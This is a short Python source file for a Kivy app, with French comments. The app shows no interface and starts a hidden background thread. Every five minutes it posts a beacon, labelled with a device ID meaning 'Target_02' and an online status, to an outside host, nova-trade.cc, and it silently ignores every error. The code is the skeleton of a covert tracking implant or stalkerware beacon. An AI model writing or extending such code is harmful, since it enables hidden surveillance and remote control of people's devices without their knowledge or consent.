from kivy.app import App
import requests
import threading
import time

class ControlApp(App):
    def build(self):
        # On lance le tracking dans un thread séparé pour ne pas bloquer l'app
        threading.Thread(target=self.envoi_donnees, daemon=True).start()
        return None # L'app sera invisible ou affichera un écran noir

    def envoi_donnees(self):
        while True:
            try:
                # Ici on simule l'envoi vers ton API
                requests.post("https://nova-trade.cc/api/track", 
                              json={"device_id": "Cible_02", "status": "online"})
            except:
                pass
            time.sleep(300)

if __name__ == '__main__':
    ControlApp().run()

